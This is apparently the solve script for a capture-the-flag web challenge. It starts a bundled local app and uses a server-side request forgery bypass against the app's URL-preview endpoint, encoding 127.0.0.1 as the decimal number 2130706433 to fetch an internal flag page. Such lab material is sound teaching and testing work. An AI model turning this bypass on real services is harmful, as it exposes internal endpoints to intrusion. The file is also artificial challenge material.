#!/usr/bin/env python3
from __future__ import annotations

import os
import re
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
from pathlib import Path


def start(app: Path, port: int):
    env = os.environ.copy()
    env['PORT'] = str(port)
    proc = subprocess.Popen([sys.executable, str(app)], cwd=app.parent, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    for _ in range(80):
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.1):
                return proc
        except OSError:
            time.sleep(0.1)
    raise SystemExit('server not ready')


def main() -> None:
    root = Path(__file__).resolve().parents[1]
    proc = start(root / 'docker' / 'app.py', 18107)
    try:
        target = urllib.parse.quote('http://2130706433:18107/internal/flag', safe='')
        body = urllib.request.urlopen(f'http://127.0.0.1:18107/preview?url={target}').read().decode()
        match = re.search(r'flag\{[a-zA-Z0-9_\-]+\}', body)
        if not match:
            raise SystemExit('flag not found')
        print(match.group(0))
    finally:
        proc.terminate()
        proc.wait(timeout=5)


if __name__ == '__main__':
    main()
